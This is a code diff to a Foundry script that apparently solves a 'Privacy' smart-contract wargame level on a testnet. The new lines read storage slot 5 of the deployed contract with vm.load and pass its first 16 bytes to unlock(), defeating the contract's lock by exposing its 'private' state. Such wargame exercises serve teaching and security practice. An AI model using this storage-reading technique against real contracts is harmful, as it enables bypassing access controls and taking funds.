@@ -12,6 +12,7 @@ contract PrivacyScript is Script {
 
     function run() external {
         console.log("Solving Privacy Contract...");
+        privacyContract = Privacy(payable(0x960072BAB02BE3736F3bCE60604966b73c70Cb3C));
 
         uint256 id;
         assembly {
@@ -19,7 +20,7 @@ contract PrivacyScript is Script {
         }
 
         if (id== 80002) {
-            privacyContract = Privacy(payable(0x960072BAB02BE3736F3bCE60604966b73c70Cb3C));
+           
         } else {
             vm.startBroadcast(deployerPrivateKey);
 
@@ -34,12 +35,12 @@ contract PrivacyScript is Script {
         console.log("State of lock: ", privacyContract.locked());
 
         // Attempt to unlock with a known key (for example purposes)
-        bytes16 knownKey = bytes16(bytes32(0)); 
+         bytes32 myKey = vm.load(address(privacyContract), bytes32(uint256(5)));
 
         vm.startBroadcast(deployerPrivateKey);
 
         // Call the unlock function with the known key
-        privacyContract.unlock(knownKey);
+        privacyContract.unlock(bytes16(myKey));
 
         vm.stopBroadcast();
 
